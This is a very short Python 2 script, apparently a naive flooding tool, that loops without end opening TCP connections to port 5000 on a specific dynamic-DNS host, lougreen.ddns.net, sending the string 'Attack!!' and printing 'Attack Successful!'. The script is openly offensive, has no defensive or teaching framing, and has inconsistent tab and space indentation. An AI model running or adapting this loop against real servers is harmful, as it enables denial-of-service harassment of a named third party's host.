#!/usr/bin/env python
#
#Comments!
############
import socket, sys, os  
 
while True:  
    try: 
	print "Attacking lougreen.ddns.net"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
	s.connect(("lougreen.ddns.net", 5000))
	s.send("Attack!!")  
	print "Attack Successful!"
	s.close()
    except socket.error:
	print "Error: No Connection Found"
